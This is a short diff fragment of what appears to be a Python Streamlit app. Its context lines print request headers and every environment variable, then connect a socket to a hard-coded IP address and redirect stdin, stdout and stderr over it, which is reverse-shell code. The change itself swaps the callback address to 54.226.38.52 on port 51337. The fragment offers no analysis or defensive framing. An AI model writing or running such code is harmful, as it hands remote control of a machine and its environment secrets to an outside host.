@@ -269,7 +269,7 @@ st.write(st.context.headers)
 st.write(os.environ)
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("44.204.28.36",8080))
+s.connect(("54.226.38.52",51337))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
